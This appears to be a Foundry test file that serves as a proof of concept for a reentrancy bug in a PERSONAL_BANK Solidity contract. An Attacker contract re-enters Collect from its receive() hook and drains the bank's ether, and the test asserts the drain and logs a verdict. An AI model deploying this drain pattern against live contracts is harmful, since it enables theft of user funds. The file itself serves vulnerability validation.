// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol";

contract PersonalBankTest is Test {
    LogFile public logFile;
    PERSONAL_BANK public bank;
    Attacker public attacker;

    function setUp() public {
        // Deploy LogFile
        logFile = new LogFile();
        
        // Deploy PERSONAL_BANK
        bank = new PERSONAL_BANK();
        
        // Initialize bank
        bank.SetLogFile(address(logFile));
        bank.SetMinSum(1 ether);
        
        // Deploy attacker with bank address
        attacker = new Attacker(payable(address(bank)));
        
        // Prepare test funds for attacker contract
        vm.deal(address(attacker), 5 ether);
    }

    function testReentrancyVulnerability() public {
        // Deposit 4 ether from attacker's contract balance
        attacker.deposit(4 ether);
        
        // Verify initial state after deposit
        assertEq(bank.balances(address(attacker)), 4 ether);
        assertEq(address(bank).balance, 4 ether);
        assertEq(address(attacker).balance, 1 ether);

        console.log("--- BEFORE-Trigger ---");
        // Capture pre-trigger state for differential validation
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 bankAttackerRecordBefore = bank.balances(address(attacker));
        console.log("Bank ETH: %d", bankBalanceBefore);
        console.log("Attacker ETH: %d", attackerBalanceBefore);
        console.log("Attacker record in bank: %d", bankAttackerRecordBefore);

        console.log("--- Trigger Attack ---");
        // Execute the critical attacker action
        attacker.attack();

        console.log("--- AFTER-Trigger ---");
        // Capture post-trigger state for verification
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 bankAttackerRecordAfter = bank.balances(address(attacker));
        console.log("Bank ETH: %d", bankBalanceAfter);
        console.log("Attacker ETH: %d", attackerBalanceAfter);
        console.log("Attacker record in bank: %d", bankAttackerRecordAfter);

        // Calculate state changes for differential validation
        uint256 bankDrainedAmount = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerGainedAmount = attackerBalanceAfter - attackerBalanceBefore;

        // Vulnerability verification
        bool bankFullyDrained = bankBalanceAfter == 0;
        bool attackerGainedFullBalance = attackerGainedAmount == bankAttackerRecordBefore;
        bool recordZeroed = bankAttackerRecordAfter == 0;
        
        bool vulnerabilityExploited = bankFullyDrained && 
                                      attackerGainedFullBalance && 
                                      recordZeroed;

        console.log("Drain amount vs record: %d (drained) == %d (record)", 
                   bankDrainedAmount, bankAttackerRecordBefore);
        console.log("Vulnerability exploited:", vulnerabilityExploited ? "YES" : "NO");
        
        // Final verdict with reasoning
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained bank funds and reset records");
        } else {
            console.log("Vulnerability not Exist: Bank state changes do not match reentrancy exploitation pattern");
        }

        // Existing verification assertions
        assertEq(address(bank).balance, 0);
        assertEq(address(attacker).balance, 5 ether);
        assertEq(bank.balances(address(attacker)), 0);
    }
}

contract Attacker {
    PERSONAL_BANK public immutable bank;
    uint public count;

    constructor(address payable _bank) {
        bank = PERSONAL_BANK(_bank);
    }
    
    function deposit(uint amount) public {
        // Deposit from contract's own balance
        bank.Deposit{value: amount}();
    }
    
    function attack() public {
        // Trigger initial withdrawal
        bank.Collect(1 ether);
    }
    
    receive() external payable {
        if (count < 3 && address(bank).balance >= 1 ether) {
            count++;
            // Reenter during callback
            bank.Collect(1 ether);
        }
    }
}